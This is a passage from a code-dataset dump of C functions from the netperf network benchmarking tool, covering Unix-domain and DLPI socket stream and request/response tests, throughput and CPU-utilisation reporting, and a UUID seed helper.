if (!netperf_response.content.serv_errno) {\n    if (debug)\n      fprintf(where,\"remote listen done.\\n\");\n    rsr_size\t        =\tstream_stream_response->recv_buf_size;\n    rss_size\t        =\tstream_stream_response->send_buf_size;\n    remote_cpu_usage    =\tstream_stream_response->measure_cpu;\n    remote_cpu_rate     = \tstream_stream_response->cpu_rate;\n    strcpy(server.sun_path,stream_stream_response->unix_path);\n  }\n  else {\n    Set_errno(netperf_response.content.serv_errno);\n    perror(\"netperf: send_stream_stream: remote error\");\n    exit(1);\n  }\n\n  /*Connect up to the remote port on the data socket  */\n  if (connect(send_socket,\n\t      (struct sockaddr *)&server,\n\t      sizeof(server)) == INVALID_SOCKET){\n    perror(\"netperf: send_stream_stream: data socket connect failed\");\n    printf(\" path: %s\\n\",server.sun_path);\n    exit(1);\n  }\n\n  /* Data Socket set-up is finished. If there were problems, either\n     the connect would have failed, or the previous response would\n     have indicated a problem. I failed to see the value of the extra\n     message after the accept on the remote. If it failed, we'll see\n     it here. If it didn't, we might as well start pumping data. */\n\n  /* Set-up the test end conditions. For a stream test, they can be\n     either time or byte-count based. */\n\n  if (test_time) {\n    /* The user wanted to end the test after a period of time. */\n    times_up = 0;\n    bytes_remaining = 0;\n    start_timer(test_time);\n  }\n  else {\n    /* The tester wanted to send a number of bytes. */\n    bytes_remaining = test_bytes;\n    times_up = 1;\n  }\n\n  /* The cpu_start routine will grab the current time and possibly\n     value of the idle counter for later use in measuring cpu\n     utilization and/or service demand and thruput. */\n\n  cpu_start(local_cpu_usage);\n\n  /* We use an \"OR\" to control test execution. When the test is\n     controlled by time, the byte count check will always return\n     false.  When the test is controlled by byte count, the time test\n     will always return false. When the test is finished, the whole\n     expression will go false and we will stop sending data. */\n\n#ifdef DIRTY\n  /* initialize the random number generator for putting dirty stuff\n     into the send buffer. raj */\n  srand((int) getpid());\n#endif\n\n  while ((!times_up) || (bytes_remaining > 0)) {\n\n#ifdef DIRTY\n    /* we want to dirty some number of consecutive integers in the\n       buffer we are about to send. we may also want to bring some\n       number of them cleanly into the cache. The clean ones will\n       follow any dirty ones into the cache. at some point, we might\n       want to replace the rand() call with something from a table to\n       reduce our call overhead during the test, but it is not a high\n       priority item. */\n    message_int_ptr = (int *)(send_ring->buffer_ptr);\n    for (i = 0; i < loc_dirty_count; i++) {\n      *message_int_ptr = rand();\n      message_int_ptr++;\n    }\n    for (i = 0; i < loc_clean_count; i++) {\n      loc_dirty_count = *message_int_ptr;\n      message_int_ptr++;\n    }\n#endif /* DIRTY */\n\n    if((len=send(send_socket,\n\t\t send_ring->buffer_ptr,\n\t\t send_size,\n\t\t 0)) != send_size) {\n      if ((len >=0) || (errno == EINTR)) {\n\t/* the test was interrupted, must be the end of test */\n\tbreak;\n      }\n      perror(\"netperf: data send error\");\n      printf(\"len was %d\\n\",len);\n      exit(1);\n    }\n#ifdef WANT_INTERVALS\n    for (interval_count = 0;\n\t interval_count < interval_wate;\n\t interval_count++);\n#endif\n\n    /* now we want to move our pointer to the next position in the\n       data buffer...we may also want to wrap back to the \"beginning\"\n       of the bufferspace, so we will mod the number of messages sent\n       by the send width, and use that to calculate the offset to add\n       to the base pointer. */\n    nummessages++;\n    send_ring = send_ring->next;\n    if (bytes_remaining) {\n      bytes_remaining -= send_size;\n    }\n  }\n\n  /* The test is over. Flush the buffers to the remote end. We do a\n     graceful release to insure that all data has been taken by the\n     remote. */\n\n  if (close(send_socket) == -1) {\n    perror(\"netperf: send_stream_stream: cannot close socket\");\n    exit(1);\n  }\n\n  /* this call will always give us the elapsed time for the test, and\n     will also store-away the necessaries for cpu utilization */\n\n  cpu_stop(local_cpu_usage,&elapsed_time); /* was cpu being measured\n\t\t\t\t\t      and how long did we\n\t\t\t\t\t      really run? */\n\n  /* Get the statistics from the remote end. The remote will have\n     calculated service demand and all those interesting things. If it\n     wasn't supposed to care, it will return obvious values. */\n\n  recv_response();\n  if (!netperf_response.content.serv_errno) {\n    if (debug)\n      fprintf(where,\"remote results obtained\\n\");\n  }\n  else {\n    Set_errno(netperf_response.content.serv_errno);\n    perror(\"netperf: remote error\");\n\n    exit(1);\n  }\n\n  /* We now calculate what our thruput was for the test. In the\n     future, we may want to include a calculation of the thruput\n     measured by the remote, but it should be the case that for a\n     STREAM stream test, that the two numbers should be *very*\n     close... We calculate bytes_sent regardless of the way the test\n     length was controlled.  If it was time, we needed to, and if it\n     was by bytes, the user may have specified a number of bytes that\n     wasn't a multiple of the send_size, so we really didn't send what\n     he asked for ;-) */\n\n  bytes_sent\t= ((double) send_size * (double) nummessages) + len;\n  thruput\t= calc_thruput(bytes_sent);\n\n  if (local_cpu_usage || remote_cpu_usage) {\n    /* We must now do a little math for service demand and cpu\n       utilization for the system(s) Of course, some of the\n       information might be bogus because there was no idle counter in\n       the kernel(s). We need to make a note of this for the user's\n       benefit...*/\n    if (local_cpu_usage) {\n      if (local_cpu_rate == 0.0) {\n\tfprintf(where,\"WARNING WARNING WARNING  WARNING WARNING WARNING  WARNING!\\n\");\n\tfprintf(where,\"Local CPU usage numbers based on process information only!\\n\");\n\tfflush(where);\n      }\n      local_cpu_utilization\t= calc_cpu_util(0.0);\n      local_service_demand\t= calc_service_demand(bytes_sent,\n\t\t\t\t\t\t      0.0,\n\t\t\t\t\t\t      0.0,\n\t\t\t\t\t\t      0);\n    }\n    else {\n      local_cpu_utilization\t= -1.0;\n      local_service_demand\t= -1.0;\n    }\n\n    if (remote_cpu_usage) {\n      if (remote_cpu_rate == 0.0) {\n\tfprintf(where,\"DANGER   DANGER  DANGER   DANGER   DANGER  DANGER   DANGER!\\n\");\n\tfprintf(where,\"Remote CPU usage numbers based on process information only!\\n\");\n\tfflush(where);\n      }\n      remote_cpu_utilization\t= stream_stream_result->cpu_util;\n      remote_service_demand\t= calc_service_demand(bytes_sent,\n\t\t\t\t\t\t      0.0,\n\t\t\t\t\t\t      remote_cpu_utilization,\n\t\t\t\t\t\t      stream_stream_result->num_cpus);\n    }\n    else {\n      remote_cpu_utilization = -1.0;\n      remote_service_demand  = -1.0;\n    }\n\n    /* We are now ready to print all the information. If the user has\n       specified zero-level verbosity, we will just print the local\n       service demand, or the remote service demand. If the user has\n       requested verbosity level 1, he will get the basic \"streamperf\"\n       numbers. If the user has specified a verbosity of greater than\n       1, we will display a veritable plethora of background\n       information from outside of this block as it it not\n       cpu_measurement specific...  */\n\n    switch (verbosity) {\n    case 0:\n      if (local_cpu_usage) {\n\tfprintf(where,\n\t\tcpu_fmt_0,\n\t\tlocal_service_demand);\n      }\n      else {\n\tfprintf(where,\n\t\tcpu_fmt_0,\n\t\tremote_service_demand);\n      }\n      break;\n    case 1:\n    case 2:\n      fprintf(where,\n\t      cpu_fmt_1,\t\t/* the format string */\n\t      rsr_size,\t\t        /* remote recvbuf size */\n\t      lss_size,\t\t        /* local sendbuf size */\n\t      send_size,\t\t/* how large were the sends */\n\t      elapsed_time,\t\t/* how long was the test */\n\t      thruput, \t\t        /* what was the xfer rate */\n\t      local_cpu_utilization,\t/* local cpu */\n\t      remote_cpu_utilization,\t/* remote cpu */\n\t      local_service_demand,\t/* local service demand */\n\t      remote_service_demand);\t/* remote service demand */\n      break;\n    }\n  }\n  else {\n    /* The tester did not wish to measure service demand. */\n    switch (verbosity) {\n    case 0:\n      fprintf(where,\n\t      tput_fmt_0,\n\t      thruput);\n      break;\n    case 1:\n    case 2:\n      fprintf(where,\n\t      tput_fmt_1,    /* the format string */\n\t      rsr_size,      /* remote recvbuf size */\n\t      lss_size,      /* local sendbuf size */\n\t      send_size,     /* how large were the sends */\n\t      elapsed_time,  /* how long did it take */\n\t      thruput);      /* how fast did it go */\n      break;\n    }\n  }\n\n  /* it would be a good thing to include information about some of the\n     other parameters that may have been set for this test, but at the\n     moment, I do not wish to figure-out all the formatting, so I will\n     just put this comment here to help remind me that it is something\n     that should be done at a later time. */\n\n  if (verbosity > 1) {\n    /* The user wanted to know it all, so we will give it to him.\n       This information will include as much as we can find about\n       STREAM statistics, the alignments of the sends and receives and\n       all that sort of rot... */\n\n    fprintf(where,\n\t    ksink_fmt,\n\t    \"Bytes\",\n\t    \"Bytes\",\n\t    \"Bytes\",\n\t    local_send_align,\n\t    remote_recv_align,\n\t    local_send_offset,\n\t    remote_recv_offset,\n\t    bytes_sent,\n\t    bytes_sent / (double)nummessages,\n\t    nummessages,\n\t    bytes_sent / (double)stream_stream_result->recv_calls,\n\t    stream_stream_result->recv_calls);\n  }\n\n}", "path": "netperf/src/nettest_unix.c", "commit_date": "2015-10-30 00:00:00", "repo_name": "HewlettPackard/netperf", "stars": 814, "license": "mit", "language": "c", "size": 15948}
{"docstring": "/* this routine implements the receive side (netserver) of a DG_RR\n    test. */\n", "func_signal": "void\nrecv_dg_rr()", "code": "{\n\n  struct ring_elt *recv_ring;\n  struct ring_elt *send_ring;\n\n  struct\tsockaddr_un        myaddr_un,\n  peeraddr_un;\n  SOCKET s_data;\n  netperf_socklen_t addrlen;\n  int\ttrans_received = 0;\n  int\ttrans_remaining;\n  float\telapsed_time;\n\n  struct\tdg_rr_request_struct\t*dg_rr_request;\n  struct\tdg_rr_response_struct\t*dg_rr_response;\n  struct\tdg_rr_results_struct\t*dg_rr_results;\n\n  dg_rr_request  =\n    (struct dg_rr_request_struct *)netperf_request.content.test_specific_data;\n  dg_rr_response =\n    (struct dg_rr_response_struct *)netperf_response.content.test_specific_data;\n  dg_rr_results  =\n    (struct dg_rr_results_struct *)netperf_response.content.test_specific_data;\n\n  if (debug) {\n    fprintf(where,\"netserver: recv_dg_rr: entered...\\n\");\n    fflush(where);\n  }\n\n  /* We want to set-up the listen socket with all the desired\n     parameters and then let the initiator know that all is ready. If\n     socket size defaults are to be used, then the initiator will have\n     sent us 0's. If the socket sizes cannot be changed, then we will\n     send-back what they are. If that information cannot be\n     determined, then we send-back -1's for the sizes. If things go\n     wrong for any reason, we will drop back ten yards and punt. */\n\n  /* If anything goes wrong, we want the remote to know about it. It\n     would be best if the error that the remote reports to the user is\n     the actual error we encountered, rather than some bogus\n     unexpected response type message. */\n\n  if (debug) {\n    fprintf(where,\"recv_dg_rr: setting the response type...\\n\");\n    fflush(where);\n  }\n\n  netperf_response.content.response_type = DG_RR_RESPONSE;\n\n  if (debug) {\n    fprintf(where,\"recv_dg_rr: the response type is set...\\n\");\n    fflush(where);\n  }\n\n  /* We now alter the message_ptr variables to be at the desired\n     alignments with the desired offsets. */\n\n  if (debug) {\n    fprintf(where,\"recv_dg_rr: requested recv alignment of %d offset %d\\n\",\n\t    dg_rr_request->recv_alignment,\n\t    dg_rr_request->recv_offset);\n    fprintf(where,\"recv_dg_rr: requested send alignment of %d offset %d\\n\",\n\t    dg_rr_request->send_alignment,\n\t    dg_rr_request->send_offset);\n    fflush(where);\n  }\n\n  if (send_width == 0) send_width = 1;\n  if (recv_width == 0) recv_width = 1;\n\n  recv_ring = allocate_buffer_ring(recv_width,\n\t\t\t\t   dg_rr_request->request_size,\n\t\t\t\t   dg_rr_request->recv_alignment,\n\t\t\t\t   dg_rr_request->recv_offset);\n\n  send_ring = allocate_buffer_ring(send_width,\n\t\t\t\t   dg_rr_request->response_size,\n\t\t\t\t   dg_rr_request->send_alignment,\n\t\t\t\t   dg_rr_request->send_offset);\n\n  if (debug) {\n    fprintf(where,\"recv_dg_rr: receive alignment and offset set...\\n\");\n    fflush(where);\n  }\n\n  /* Let's clear-out our sockaddr for the sake of cleanlines. Then we\n     can put in OUR values !-) At some point, we may want to nail this\n     socket to a particular network-level address, but for now,\n     INADDR_ANY should be just fine. */\n\n  bzero((char *)&myaddr_un,\n\tsizeof(myaddr_un));\n  myaddr_un.sun_family      = AF_UNIX;\n\n  /* Grab a socket to listen on, and then listen on it. */\n\n  if (debug) {\n    fprintf(where,\"recv_dg_rr: grabbing a socket...\\n\");\n    fflush(where);\n  }\n\n\n  /* create_unix_socket expects to find some things in the global\n     variables, so set the globals based on the values in the request.\n     once the socket has been created, we will set the response values\n     based on the updated value of those globals. raj 7/94 */\n  lss_size_req = dg_rr_request->send_buf_size;\n  lsr_size_req = dg_rr_request->recv_buf_size;\n\n  s_data = create_unix_socket(AF_UNIX,\n\t\t\t      SOCK_DGRAM);\n\n  if (s_data == INVALID_SOCKET) {\n    netperf_response.content.serv_errno = errno;\n    send_response();\n\n    exit(1);\n  }\n\n  /* Let's get an address assigned to this socket so we can tell the\n     initiator how to reach the data socket. There may be a desire to\n     nail this socket to a specific IP address in a multi-homed,\n     multi-connection situation, but for now, we'll ignore the issue\n     and concentrate on single connection testing. */\n\n  strcpy(myaddr_un.sun_path,tempnam(path_prefix,\"netperf.\"));\n  if (bind(s_data,\n\t   (struct sockaddr *)&myaddr_un,\n\t   sizeof(myaddr_un)) == SOCKET_ERROR) {\n    netperf_response.content.serv_errno = errno;\n    unlink(myaddr_un.sun_path);\n    close(s_data);\n    send_response();\n\n    exit(1);\n  }\n\n  /* Now myaddr_un contains the port and the internet address this is\n     returned to the sender also implicitly telling the sender that\n     the socket buffer sizing has been done. */\n\n  strcpy(dg_rr_response->unix_path,myaddr_un.sun_path);\n  netperf_response.content.serv_errno   = 0;\n\n  /* But wait, there's more. If the initiator wanted cpu measurements,\n     then we must call the calibrate routine, which will return the\n     max rate back to the initiator. If the CPU was not to be\n     measured, or something went wrong with the calibration, we will\n     return a 0.0 to the initiator. */\n\n  dg_rr_response->cpu_rate = 0.0; \t/* assume no cpu */\n  if (dg_rr_request->measure_cpu) {\n    dg_rr_response->measure_cpu = 1;\n    dg_rr_response->cpu_rate = calibrate_local_cpu(dg_rr_request->cpu_rate);\n  }\n\n  /* before we send the response back to the initiator, pull some of\n     the socket parms from the globals */\n  dg_rr_response->send_buf_size = lss_size;\n  dg_rr_response->recv_buf_size = lsr_size;\n\n  send_response();\n\n\n  /* Now it's time to start receiving data on the connection. We will\n     first grab the apropriate counters and then start grabbing. */\n\n  cpu_start(dg_rr_request->measure_cpu);\n\n  if (dg_rr_request->test_length > 0) {\n    times_up = 0;\n    trans_remaining = 0;\n    start_timer(dg_rr_request->test_length + PAD_TIME);\n  }\n  else {\n    times_up = 1;\n    trans_remaining = dg_rr_request->test_length * -1;\n  }\n\n  addrlen = sizeof(peeraddr_un);\n  bzero((char *)&peeraddr_un, addrlen);\n\n  while ((!times_up) || (trans_remaining > 0)) {\n\n    /* receive the request from the other side */\n    fprintf(where,\"socket %d ptr %p size %d\\n\",\n\t    s_data,\n\t    recv_ring->buffer_ptr,\n\t    dg_rr_request->request_size);\n    fflush(where);\n    if (recvfrom(s_data,\n\t\t recv_ring->buffer_ptr,\n\t\t dg_rr_request->request_size,\n\t\t 0,\n\t\t (struct sockaddr *)&peeraddr_un,\n\t\t &addrlen) != dg_rr_request->request_size) {\n      if (errno == EINTR) {\n\t/* we must have hit the end of test time. */\n\tbreak;\n      }\n      netperf_response.content.serv_errno = errno;\n      fprintf(where,\"error on recvfrom errno %d\\n\",errno);\n      fflush(where);\n      send_response();\n      unlink(myaddr_un.sun_path);\n      exit(1);\n    }\n    recv_ring = recv_ring->next;\n\n    /* Now, send the response to the remote */\n    if (sendto(s_data,\n\t       send_ring->buffer_ptr,\n\t       dg_rr_request->response_size,\n\t       0,\n\t       (struct sockaddr *)&peeraddr_un,\n\t       addrlen) != dg_rr_request->response_size) {\n      if (errno == EINTR) {\n\t/* we have hit end of test time. */\n\tbreak;\n      }\n      netperf_response.content.serv_errno = errno;\n      fprintf(where,\"error on recvfrom errno %d\\n\",errno);\n      fflush(where);\n      unlink(myaddr_un.sun_path);\n      send_response();\n      exit(1);\n    }\n    send_ring = send_ring->next;\n\n    trans_received++;\n    if (trans_remaining) {\n      trans_remaining--;\n    }\n\n    if (debug) {\n      fprintf(where,\n\t      \"recv_dg_rr: Transaction %d complete.\\n\",\n\t      trans_received);\n      fflush(where);\n    }\n\n  }\n\n\n  /* The loop now exits due to timeout or transaction count being\n     reached */\n\n  cpu_stop(dg_rr_request->measure_cpu,&elapsed_time);\n\n  if (times_up) {\n    /* we ended the test by time, which was at least 2 seconds longer\n       than we wanted to run. so, we want to subtract PAD_TIME from\n       the elapsed_time. */\n    elapsed_time -= PAD_TIME;\n  }\n  /* send the results to the sender\t\t\t*/\n\n  if (debug) {\n    fprintf(where,\n\t    \"recv_dg_rr: got %d transactions\\n\",\n\t    trans_received);\n    fflush(where);\n  }\n\n  dg_rr_results->bytes_received\t= (trans_received *\n\t\t\t\t\t   (dg_rr_request->request_size +\n\t\t\t\t\t    dg_rr_request->response_size));\n  dg_rr_results->trans_received\t= trans_received;\n  dg_rr_results->elapsed_time\t= elapsed_time;\n  if (dg_rr_request->measure_cpu) {\n    dg_rr_results->cpu_util\t= calc_cpu_util(elapsed_time);\n  }\n\n  if (debug) {\n    fprintf(where,\n\t    \"recv_dg_rr: test complete, sending results.\\n\");\n    fflush(where);\n  }\n\n  send_response();\n  unlink(myaddr_un.sun_path);\n\n}", "path": "netperf/src/nettest_unix.c", "commit_date": "2015-10-30 00:00:00", "repo_name": "HewlettPackard/netperf", "stars": 814, "license": "mit", "language": "c", "size": 15948}
{"docstring": "/* Sample code, not for use in production; see RFC 1750 */\n", "func_signal": "static void get_random_info(char seed[16])", "code": "{\n  uint16_t myrand;\n  int i;\n\n  i = 0;\n  do {\n    myrand = true_random();\n    seed[i++] = myrand & 0xff;\n    seed[i++] = myrand >> 8;\n  } while (i < 14);\n\n}", "path": "netperf/src/net_uuid.c", "commit_date": "2016-06-02 00:00:00", "repo_name": "HewlettPackard/netperf", "stars": 814, "license": "mit", "language": "c", "size": 15948}
{"docstring": "/* This is the server-side routine for the tcp stream test. It is */\n/* implemented as one routine. I could break things-out somewhat, but */\n/* didn't feel it was necessary. */\n", "func_signal": "int\n  recv_dlpi_co_stream()", "code": "{\n\n  int\tdata_descriptor;\n  int\tflags = 0;\n  int\tmeasure_cpu;\n  int\tbytes_received;\n  int\treceive_calls;\n  float\telapsed_time;\n\n  struct ring_elt *recv_ring;\n  char\t*message_ptr;\n  char\t*message;\n  int   *message_int_ptr;\n  struct strbuf recv_message;\n  int   dirty_count;\n  int   clean_count;\n  int   i;\n\n  struct\tdlpi_co_stream_request_struct\t*dlpi_co_stream_request;\n  struct\tdlpi_co_stream_response_struct\t*dlpi_co_stream_response;\n  struct\tdlpi_co_stream_results_struct\t*dlpi_co_stream_results;\n\n  dlpi_co_stream_request\t= (struct dlpi_co_stream_request_struct *)netperf_request.content.test_specific_data;\n  dlpi_co_stream_response\t= (struct dlpi_co_stream_response_struct *)netperf_response.content.test_specific_data;\n  dlpi_co_stream_results\t= (struct dlpi_co_stream_results_struct *)netperf_response.content.test_specific_data;\n\n  if (debug) {\n    fprintf(where,\"netserver: recv_dlpi_co_stream: entered...\\n\");\n    fflush(where);\n  }\n\n  /* We want to set-up the listen socket with all the desired */\n  /* parameters and then let the initiator know that all is ready. If */\n  /* socket size defaults are to be used, then the initiator will have */\n  /* sent us 0's. If the socket sizes cannot be changed, then we will */\n  /* send-back what they are. If that information cannot be determined, */\n  /* then we send-back -1's for the sizes. If things go wrong for any */\n  /* reason, we will drop back ten yards and punt. */\n\n  /* If anything goes wrong, we want the remote to know about it. It */\n  /* would be best if the error that the remote reports to the user is */\n  /* the actual error we encountered, rather than some bogus unexpected */\n  /* response type message. */\n\n  netperf_response.content.response_type = DLPI_CO_STREAM_RESPONSE;\n\n  /* We now alter the message_ptr variable to be at the desired */\n  /* alignment with the desired offset. */\n\n  if (debug > 1) {\n    fprintf(where,\"recv_dlpi_co_stream: requested alignment of %d\\n\",\n\t    dlpi_co_stream_request->recv_alignment);\n    fflush(where);\n  }\n\n\n  /* Grab a descriptor to listen on, and then listen on it. */\n\n  if (debug > 1) {\n    fprintf(where,\"recv_dlpi_co_stream: grabbing a descriptor...\\n\");\n    fflush(where);\n  }\n\n\n\n#ifdef __alpha\n\n  /* ok - even on a DEC box, strings are strings. I din't really want */\n  /* to ntohl the words of a string. since I don't want to teach the */\n  /* send_ and recv_ _request and _response routines about the types, */\n  /* I will put \"anti-ntohl\" calls here. I imagine that the \"pure\" */\n  /* solution would be to use XDR, but I am still leary of being able */\n  /* to find XDR libs on all platforms I want running netperf. raj */\n  {\n    int *charword;\n    int *initword;\n    int *lastword;\n\n    initword = (int *) dlpi_co_stream_request->dlpi_device;\n    lastword = initword + ((dlpi_co_stream_request->dev_name_len + 3) / 4);\n\n    for (charword = initword;\n\t charword < lastword;\n\t charword++) {\n\n      *charword = htonl(*charword);\n    }\n  }\n#endif /* __alpha */\n\n  data_descriptor = dl_open(dlpi_co_stream_request->dlpi_device,\n\t\t\t    dlpi_co_stream_request->ppa);\n  if (data_descriptor < 0) {\n    netperf_response.content.serv_errno = errno;\n    send_response();\n    exit(1);\n  }\n\n  /* Let's get an address assigned to this descriptor so we can tell the */\n  /* initiator how to reach the data descriptor. There may be a desire to */\n  /* nail this descriptor to a specific address in a multi-homed, */\n  /* multi-connection situation, but for now, we'll ignore the issue */\n  /* and concentrate on single connection testing. */\n\n  /* bind the sap and retrieve the dlsap assigned by the system  */\n  dlpi_co_stream_response->station_addr_len = 14; /* arbitrary */\n  if (dl_bind(data_descriptor,\n\t      dlpi_co_stream_request->sap,\n\t      DL_CODLS,\n\t      (char *)dlpi_co_stream_response->station_addr,\n\t      &dlpi_co_stream_response->station_addr_len) != 0) {\n    fprintf(where,\"recv_dlpi_co_stream: bind failure\\n\");\n    fflush(where);\n    exit(1);\n  }\n\n  /* The initiator may have wished-us to modify the socket buffer */\n  /* sizes. We should give it a shot. If he didn't ask us to change the */\n  /* sizes, we should let him know what sizes were in use at this end. */\n  /* If none of this code is compiled-in, then we will tell the */\n  /* initiator that we were unable to play with the socket buffer by */\n  /* setting the size in the response to -1. */\n\n#ifdef DL_HP_SET_LOCAL_WIN_REQ\n\n  if (dlpi_co_stream_request->recv_win_size) {\n  }\n  /* Now, we will find-out what the size actually became, and report */\n  /* that back to the user. If the call fails, we will just report a -1 */\n  /* back to the initiator for the recv buffer size. */\n\n#else /* the system won't let us play with the buffers */\n\n  dlpi_co_stream_response->recv_win_size\t= -1;\n\n#endif /* DL_HP_SET_LOCAL_WIN_REQ */\n\n  /* what sort of sizes did we end-up with? */\n  /* this bit of code whould default to the Interface MTU */\n  if (dlpi_co_stream_request->receive_size == 0) {\n    recv_size = 1024;\n  }\n  else {\n    recv_size = dlpi_co_stream_request->receive_size;\n  }\n\n  /* tell the other fellow what our receive size became */\n  dlpi_co_stream_response->receive_size = recv_size;\n\n  /* just a little prep work for when we may have to behave like the */\n  /* sending side... */\n  message = (char *)malloc(recv_size * 2);\n  if (message == NULL) {\n    printf(\"malloc(%d) failed!\\n\", recv_size * 2);\n    exit(1);\n  }\n\n  message_ptr = ALIGN_BUFFER(message, dlpi_co_stream_request->recv_alignment, dlpi_co_stream_request->recv_offset);\n  recv_message.maxlen = recv_size;\n  recv_message.len = 0;\n  recv_message.buf = message_ptr;\n\n  if (debug > 1) {\n    fprintf(where,\n\t    \"recv_dlpi_co_stream: receive alignment and offset set...\\n\");\n    fflush(where);\n  }\n\n  netperf_response.content.serv_errno   = 0;\n\n  /* But wait, there's more. If the initiator wanted cpu measurements, */\n  /* then we must call the calibrate routine, which will return the max */\n  /* rate back to the initiator. If the CPU was not to be measured, or */\n  /* something went wrong with the calibration, we will return a -1 to */\n  /* the initiator. */\n\n  dlpi_co_stream_response->cpu_rate = 0.0; \t/* assume no cpu */\n  if (dlpi_co_stream_request->measure_cpu) {\n    dlpi_co_stream_response->measure_cpu = 1;\n    dlpi_co_stream_response->cpu_rate =\n      calibrate_local_cpu(dlpi_co_stream_request->cpu_rate);\n  }\n\n  send_response();\n\n  /* accept a connection on this file descriptor. at some point, */\n  /* dl_accept will \"do the right thing\" with the last two parms, but */\n  /* for now it ignores them, so we will pass zeros. */\n\n  if(dl_accept(data_descriptor, 0, 0) != 0) {\n    fprintf(where,\n\t    \"recv_dlpi_co_stream: error in accept, errno %d\\n\",\n\t    errno);\n    fflush(where);\n    netperf_response.content.serv_errno = errno;\n    send_response();\n    exit(1);\n  }\n\n  if (debug) {\n    fprintf(where,\"netserver:recv_dlpi_co_stream: connection accepted\\n\");\n    fflush(where);\n  }\n\n  /* Now it's time to start receiving data on the connection. We will */\n  /* first grab the apropriate counters and then start grabbing. */\n\n  cpu_start(dlpi_co_stream_request->measure_cpu);\n\n#ifdef DIRTY\n  /* we want to dirty some number of consecutive integers in the buffer */\n  /* we are about to recv. we may also want to bring some number of */\n  /* them cleanly into the cache. The clean ones will follow any dirty */\n  /* ones into the cache. */\n\n  dirty_count = dlpi_co_stream_request->dirty_count;\n  clean_count = dlpi_co_stream_request->clean_count;\n  message_int_ptr = (int *)message_ptr;\n  for (i = 0; i < dirty_count; i++) {\n    *message_int_ptr = rand();\n    message_int_ptr++;\n  }\n  for (i = 0; i < clean_count; i++) {\n    dirty_count = *message_int_ptr;\n    message_int_ptr++;\n  }\n#endif /* DIRTY */\n\n  recv_message.len = recv_size;\n  while (recv_message.len == recv_size) {\n    if (getmsg(data_descriptor,\n\t       0,\n\t       &recv_message,\n\t       &flags) != 0) {\n      netperf_response.content.serv_errno = errno;\n      send_response();\n      exit(1);\n    }\n    bytes_received += recv_message.len;\n    receive_calls++;\n\n    if (debug) {\n      fprintf(where,\n\t      \"netserver:recv_dlpi_co_stream: getmsg accepted %d bytes\\n\",\n\t      recv_message.len);\n      fflush(where);\n    }\n\n\n#ifdef DIRTY\n    message_int_ptr = (int *)message_ptr;\n    for (i = 0; i < dirty_count; i++) {\n      *message_int_ptr = rand();\n      message_int_ptr++;\n    }\n    for (i = 0; i < clean_count; i++) {\n      dirty_count = *message_int_ptr;\n      message_int_ptr++;\n    }\n#endif /* DIRTY */\n\n  }\n\n  /* The loop now exits due to zero bytes received. */\n  /* should perform a disconnect to signal the sender that */\n  /* we have received all the data sent. */\n\n  if (close(data_descriptor) == -1) {\n    netperf_response.content.serv_errno = errno;\n    send_response();\n    exit(1);\n  }\n\n  cpu_stop(dlpi_co_stream_request->measure_cpu,&elapsed_time);\n\n  /* send the results to the sender\t\t\t*/\n\n  if (debug) {\n    fprintf(where,\n\t    \"recv_dlpi_co_stream: got %d bytes\\n\",\n\t    bytes_received);\n    fprintf(where,\n\t    \"recv_dlpi_co_stream: got %d recvs\\n\",\n\t    receive_calls);\n    fflush(where);\n  }\n\n  dlpi_co_stream_results->bytes_received\t= bytes_received;\n  dlpi_co_stream_results->elapsed_time\t= elapsed_time;\n  dlpi_co_stream_results->recv_calls\t\t= receive_calls;\n\n  if (dlpi_co_stream_request->measure_cpu) {\n    dlpi_co_stream_results->cpu_util\t= calc_cpu_util(0.0);\n  };\n\n  if (debug > 1) {\n    fprintf(where,\n\t    \"recv_dlpi_co_stream: test complete, sending results.\\n\");\n    fflush(where);\n  }\n\n  send_response();\n}", "path": "netperf/src/nettest_dlpi.c", "commit_date": "2012-06-19 00:00:00", "repo_name": "HewlettPackard/netperf", "stars": 814, "license": "mit", "language": "c", "size": 15948}
{"docstring": "/* these are normally found in src/netlib.c but we put copies here for\n   the nefaious popoise of standalone debugging */\n", "func_signal": "char *\nnsec_enabled_to_str(int enabled)", "code": "{\n  switch (enabled) {\n  case NSEC_UNKNOWN:\n    return(\"Unknown\");\n  case NSEC_DISABLED:\n    return(\"Disabled\");\n  case NSEC_PERMISSIVE:\n    return(\"Permissive\");\n  case NSEC_ENFORCING:\n    return(\"Enforcing\");\n  default:\n    return(\"UNKNOWN MODE\");\n  }\n}", "path": "netperf/src/netsec_linux.c", "commit_date": "2014-10-15 00:00:00", "repo_name": "HewlettPackard/netperf", "stars": 814, "license": "mit", "language": "c", "size": 15948}
{"docstring": "/* this routine implements the receive (netserver) side of a\n    STREAM_RR test */\n", "func_signal": "void\nrecv_stream_rr()", "code": "{\n\n  struct ring_elt *send_ring;\n  struct ring_elt *recv_ring;\n\n  struct\tsockaddr_un        myaddr_un,\n  peeraddr_un;\n  SOCKET s_listen,s_data;\n  netperf_socklen_t addrlen;\n  char\t*temp_message_ptr;\n  int\ttrans_received = 0;\n  int\ttrans_remaining;\n  int\tbytes_sent;\n  int\trequest_bytes_recvd;\n  int\trequest_bytes_remaining;\n  int\ttimed_out = 0;\n  float\telapsed_time;\n\n  struct\tstream_rr_request_struct\t*stream_rr_request;\n  struct\tstream_rr_response_struct\t*stream_rr_response;\n  struct\tstream_rr_results_struct\t*stream_rr_results;\n\n  stream_rr_request =\n    (struct stream_rr_request_struct *)netperf_request.content.test_specific_data;\n  stream_rr_response =\n    (struct stream_rr_response_struct *)netperf_response.content.test_specific_data;\n  stream_rr_results =\n    (struct stream_rr_results_struct *)netperf_response.content.test_specific_data;\n\n  if (debug) {\n    fprintf(where,\"netserver: recv_stream_rr: entered...\\n\");\n    fflush(where);\n  }\n\n  /* We want to set-up the listen socket with all the desired\n     parameters and then let the initiator know that all is ready. If\n     socket size defaults are to be used, then the initiator will have\n     sent us 0's. If the socket sizes cannot be changed, then we will\n     send-back what they are. If that information cannot be\n     determined, then we send-back -1's for the sizes. If things go\n     wrong for any reason, we will drop back ten yards and punt. */\n\n  /* If anything goes wrong, we want the remote to know about it. It\n     would be best if the error that the remote reports to the user is\n     the actual error we encountered, rather than some bogus\n     unexpected response type message. */\n\n  if (debug) {\n    fprintf(where,\"recv_stream_rr: setting the response type...\\n\");\n    fflush(where);\n  }\n\n  netperf_response.content.response_type = STREAM_RR_RESPONSE;\n\n  if (debug) {\n    fprintf(where,\"recv_stream_rr: the response type is set...\\n\");\n    fflush(where);\n  }\n\n  /* allocate the recv and send rings with the requested alignments\n     and offsets. raj 7/94 */\n  if (debug) {\n    fprintf(where,\"recv_stream_rr: requested recv alignment of %d offset %d\\n\",\n\t    